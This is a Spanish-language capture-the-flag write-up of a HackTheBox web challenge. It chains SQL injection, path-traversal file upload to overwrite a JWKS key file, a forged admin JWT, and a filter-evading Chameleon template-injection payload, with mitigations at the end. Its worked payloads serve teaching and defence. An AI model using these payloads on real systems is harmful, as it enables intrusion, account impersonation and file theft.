# Bobby's Bistro — HTB (Medium, Web)

> **Bandera:** no la publico — el reto está **activo**. Es la única parte de un
> writeup que no enseña nada.
>
> **Cadena:** SQLi → escritura arbitraria de ficheros → sustitución del llavero
> JWT (forjar la sesión de admin) → SSTI en Chameleon esquivando un filtro de
> caracteres → lectura de la bandera.
>
> Verificado entero en un laboratorio local reconstruido desde el Dockerfile del
> reto antes de tocar el objetivo.

---

## 1. Lo primero: matar el reflejo equivocado

El enunciado dice que hay un bot vigilando, y uno de los anuncios avisa:

> *"añadí una red de seguridad 😈, intentá algo raro y te quedás fuera hasta que vuelva"*

En un reto web con bot, el reflejo es **XSS para robarle la cookie al
administrador**. Aquí ese camino no existe, y se ve en la primera línea de
`bot.py`:

```python
import requests
...
response = session.get(chat_url)          # lee JSON y contesta
```

**El bot no es un navegador.** Es un cliente HTTP: no ejecuta JavaScript, no
tiene DOM, no hay nada que un `<script>` pueda hacerle. Lee el último mensaje del
chat, elige una respuesta de una lista y la publica. La "red de seguridad" es
decorado; no existe en el código.

> Leer el bot **antes** de diseñar el ataque ahorra el reto entero. La pregunta
> no es "¿hay un bot?" sino "¿qué ejecuta ese bot?".

Si no se le puede robar la sesión al admin, hay que **fabricarla**.

---

## 2. Los cuatro fallos

Todo el código relevante cabe en dos ficheros.

### 2.1 Inyección SQL — `/profile`

```python
token = request.form.get("token")
user_data = db.session.query(User).filter(text("token='{}'".format(token))).all()
```

Formato de cadena crudo dentro de `text()`. La consulta queda
`SELECT users.* FROM users WHERE token='<lo mío>'`, y `profile.pt` pinta el
resultado:

```html
<div tal:repeat="i user_data">
   <li>User ID: ${i.id}</li>
   <li>Username: ${i.username}</li>
   <li>Role: ${i.role}</li>
```

O sea que la inyección **tiene pantalla**: lo que devuelva la consulta se
muestra. Con `' OR 1=1--` salen todos los usuarios, incluido el administrador con
su UUID.

**Con sus controles**, que es como se comprueba que la medición sirve:

```
CONTROL SANO     mi propio token (md5 del usuario)  -> 1 usuario: yo
CONTROL NEGATIVO un token que no existe             -> vacio
INYECCION        ' OR 1=1--                          -> admin + yo
```

El control sano prueba que la consulta funciona; el negativo prueba que no
devuelve filas por defecto. Sin los dos, un resultado positivo no significa nada.

### 2.2 Escritura arbitraria de ficheros — `/api/chat-messages`

```python
file = request.files.get("attachment")
if file.filename:
    file.save(UPLOADS_DIR + "/" + file.filename)
```

**Werkzeug no limpia `filename` solo.** `secure_filename()` es una función que
hay que llamar, y aquí no se llama. El nombre viaja en la cabecera
`Content-Disposition` del multipart y lo pone el cliente, así que
`../static/cualquier_cosa` sale de la carpeta de subidas.

Comprobado con su control, para que la diferencia demuestre qué lo causó:

```
nombre normal      -> /app/uploads/normal1.txt      GET /static/normal1.txt   404
nombre con ../     -> /app/static/travesia1.txt     GET /static/travesia1.txt 200
```

Mismo endpoint, mismo fichero, mismo todo: **lo único que cambia es el `../`**.

### 2.3 El almacén de confianza está dentro de la carpeta escribible

Este es el giro del reto. `auth.py`:

```python
def verify_token(token):
    jwks_path = os.path.abspath("static/.well-known/jwks.json")
    jwks_client = PyJWKClient(f"file:///{jwks_path}")
    signing_key = jwks_client.get_signing_key_from_jwt(token)
    decoded = jwt.decode(token, signing_key.key,
                         algorithms=[signing_key.algorithm_name],
                         options={"verify_signature": True})
```

La clave pública **no está en el código**: se lee de un fichero en cada petición.
Y ese fichero vive en `static/`, justo donde el fallo anterior me deja escribir.

Entonces no hace falta romper RSA ni buscar confusión de algoritmos. Genero mi
propio par de claves, subo mi parte pública como adjunto llamado
`../static/.well-known/jwks.json`, y a partir de ese momento **el verificador
confía en mi clave**. Firmo `{"user_id": "<uuid del admin>"}` y soy el admin.

> Un almacén de confianza que se puede escribir no es un almacén de confianza.
> La escritura arbitraria parecía el fallo menor de los cuatro; es el que
> convierte "puedo subir un adjunto" en "soy quien yo diga".

Detalle que ayuda: `algorithms=[signing_key.algorithm_name]` toma el algoritmo
**de la propia clave**. Aunque aquí no hizo falta, es la misma clase de error —
dejar que el dato decida cómo se valida el dato.

### 2.4 SSTI en Chameleon, con filtro de caracteres

Ya como admin, `/api/announcements`:

```python
content = markdown.markdown(request.form.get("announcement"))
if content:
    for i in '$#{}"_.':
        content = content.replace(i, "")
tpl = PageTemplate(content)
res = tpl.render()
```

Contenido del usuario dentro de una plantilla que se renderiza. El filtro quita
`$ # { } " _ .`, y eso mata mucho:

- sin `${...}` no hay interpolación de Chameleon
- sin `"` no hay atributos con comillas dobles
- sin `_` no hay `__import__`, `__class__`, `__subclasses__`
- sin `.` no hay `os.system`, ni `.read()`, ni acceso a atributos

Lo que **no** quita: `'`, `(`, `)`, `+`, los dígitos, y los atributos `tal:`.

Probado contra la tubería exacta del servidor (markdown → filtro → Chameleon),
dentro del contenedor y con las mismas versiones:

```
[OK] sobrevive el HTML crudo a markdown          <p>hola</p>
[OK] tal: funciona sin declarar espacio de nombres   -> 49
[OK] hay builtins                                     -> 4
[OK] existe open                        <built-in function open>
[OK] construir texto con chr sin puntos              -> /a
[OK] leer un fichero sin puntos ni guiones   ['22eaa70a8fbe\n']
```

La última es la clave. Dos trucos juntos:

- **`chr(46)` fabrica el punto en tiempo de ejecución.** El filtro inspecciona el
  texto que entra; no ve lo que el programa construye después. Una ruta como
  `/flag.txt` se escribe `chr(47)+chr(102)+...` y no contiene ni un punto
  literal.
- **`list(open(ruta))` evita el `.read()`.** Iterar un fichero no necesita
  acceder a ningún atributo, así que no hace falta el punto.

La carga final:

```html
<p tal:content='python: list(open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)))'>x</p>
```

Chameleon lo renderiza al publicar el anuncio, el resultado se guarda como
contenido, y se lee entrando a `/announcements`.

> Un filtro de caracteres defiende contra una **representación**, no contra una
> **capacidad**. Mientras quede una forma de construir texto en ejecución
> (`chr`, `+`, concatenación, formateo), la lista negra es decorativa.

---

## 3. La cadena, en seis peticiones

```
1. POST /register + /login          -> sesion de usuario corriente
2. POST /profile   token=' OR 1=1-- -> uuid y nombre del admin
3. POST /api/chat-messages          -> adjunto ../static/.well-known/jwks.json
4. (local) firmo {"user_id": uuid}  -> token de admin valido
5. POST /api/announcements          -> SSTI con chr()
6. GET  /announcements              -> la bandera renderizada
```

```
  [1] sesion de usuario normal ... ok
  [2] admin por SQLi ............. bobby_605453fbbe88408b0a3b  11b4e751-...
  [3] llavero sustituido ......... ok
  [4] /admin responde ............ 200 (soy admin)
  [5] anuncio publicado .......... 120 caracteres, ni un punto literal
```

---

## 4. La hora que costó, y no fue el reto

Esta es la parte que más enseña, así que va entera.

Con los cuatro fallos ya identificados y probados uno a uno, el exploit completo
**fallaba en el paso 4**: `/admin` devolvía 302. Y lo desesperante era que el
mismo ataque, hecho en un script anterior, **sí había funcionado**.

Lo que se comprobó, y todo daba bien:

- el fichero en disco dentro del contenedor era byte a byte el que yo subí ✓
- el token legítimo **dejaba de funcionar** tras la subida → la app estaba usando
  mi llavero ✓
- el mismo token, verificado a mano dentro del contenedor con el mismo fichero y
  el mismo código: **válido** ✓
- solo había un `jwks.json` en todo el contenedor, y el directorio de trabajo del
  proceso era `/app` ✓
- la app había arrancado **una sola vez**: no se regeneraron claves ✓

Cinco comprobaciones, cinco síes, y el resultado seguía siendo 401. Cuando todo
lo que medís da bien y el resultado sigue mal, **estás midiendo la cosa
equivocada**.

Así que en vez de seguir teorizando, se le quitó la mordaza al código:

```python
except:                 # el original: se traga el error y devuelve False
    return False
```

Parcheado en el contenedor para que hablara, salió a la primera:

```
VERIFY-FAIL PyJWKClientError('Unable to find a signing key that matches:
                              "b41fe52ec89e537e2f9eeaca963d0bee"')
```

Ese `kid` es **el original de la aplicación**, no el mío. El servidor nunca llegó
a ver mi token: estaba recibiendo el legítimo.

La causa era `requests.Session()`. El login guarda `auth_token` en el tarro de la
sesión con dominio `127.0.0.1`; al pasar `cookies={"auth_token": forjado}` en la
petición, requests **no reemplaza el de la sesión: manda los dos**, y el servidor
se queda con el primero. El script anterior funcionaba porque usaba llamadas
sueltas, sin sesión compartida.

**El instrumento estaba roto, no el objetivo.** Es el mismo error que un control
positivo que rompe el depurador en vez del programa: parece que medís el ataque y
estás midiendo tu propia herramienta.

Dos lecciones, y la segunda vale más que la primera:

1. En Python, para mandar una cookie concreta, o usás llamadas sin sesión o
   limpiás el tarro. `cookies=` no sustituye lo que ya hay en la sesión.
2. **Cuando todas tus comprobaciones dan bien y el resultado da mal, dejá de
   comprobar y hacé hablar al código.** Un `except:` mudo puede esconder una hora
   de trabajo. Convertirlo en un `except Exception as e: print(...)` costó tres
   líneas y resolvió el bloqueo en un intento.

---

## 5. Q&A de entrevista

**¿Por qué no sirve el XSS en este reto, si hay un bot?**
Porque el bot está escrito con `requests`, no con un navegador headless. No
ejecuta JavaScript, así que no hay dónde ejecutar la carga. La pregunta correcta
ante un bot no es si existe, sino **qué motor usa**: un `requests` solo habla
HTTP; un Selenium o un Playwright sí renderiza y sí ejecuta.

**¿Por qué la escritura arbitraria de ficheros es aquí más grave que la SQLi?**
Porque el almacén de confianza de la autenticación —el JWKS con las claves
públicas— vive dentro de la carpeta escribible y se relee en cada petición.
Escribir ese fichero equivale a poder firmar cualquier identidad. La SQLi solo
filtra datos; la escritura da **suplantación**.

**¿Werkzeug no limpia el nombre de los ficheros subidos?**
No. `FileStorage.filename` es el nombre que envía el cliente en el multipart.
`secure_filename()` existe justo para eso pero hay que llamarla, y además
conviene resolver la ruta final y comprobar que sigue dentro de la carpeta
prevista (`os.path.realpath` + comprobación de prefijo), porque un nombre "limpio"
no protege de enlaces simbólicos ni de configuraciones raras.

**El filtro quita `$ # { } " _ .`. ¿Cómo se ejecuta código igual?**
Usando `tal:content='python: ...'` con comillas simples, y construyendo cualquier
texto con `chr(n)+chr(n)+...`. El filtro mira el texto de entrada; no puede ver
las cadenas que el programa arma en ejecución. Para leer un fichero sin puntos se
usa `list(open(ruta))`, que evita el `.read()`.

**¿Qué está mal en `algorithms=[signing_key.algorithm_name]`?**
Que el algoritmo aceptado lo decide el propio material de clave en vez de estar
fijado por el servidor. Es la misma familia de errores que aceptar el `alg` de la
cabecera del token: dejás que el dato que vas a validar te diga cómo validarlo.
Lo correcto es una lista fija en el código.

**Todo tu diagnóstico daba correcto y el ataque seguía fallando. ¿Qué hiciste?**
Dejé de añadir comprobaciones y quité el `except:` mudo del código del reto en mi
laboratorio local, para ver el error real. Apareció al primer intento: el `kid`
del token que llegaba al servidor no era el mío, o sea que mi cliente estaba
mandando la cookie equivocada. El fallo estaba en mi herramienta, no en la
cadena.

---

## 6. Mitigaciones

| fallo | arreglo |
|---|---|
| **SQLi** | Parámetros ligados: `filter(User.token == token)` o `text("token=:t").bindparams(t=token)`. Nunca `format()` ni f-strings dentro de `text()`. |
| **Subida de ficheros** | `secure_filename()` **y** comprobar que la ruta final resuelta sigue dentro de la carpeta permitida. Guardar con un nombre generado por el servidor (un UUID) y conservar el original solo como metadato. |
| **Llavero escribible** | Sacar las claves del árbol servido por web y de cualquier carpeta escribible. Cargarlas al arrancar o desde un secreto montado en solo lectura, y fijar `algorithms=["RS256"]` en el código. |
| **SSTI** | No renderizar contenido de usuario como plantilla. Si hace falta HTML, sanear con lista blanca (`bleach`) y pintarlo como texto, no compilarlo. Un filtro de caracteres negro no es una defensa. |
| **Errores mudos** | `except:` sin registrar convierte cualquier fallo en un 401 idéntico. Registrar la excepción no es un lujo de desarrollo: es lo que permite distinguir "credencial mala" de "el almacén de claves fue reemplazado". |
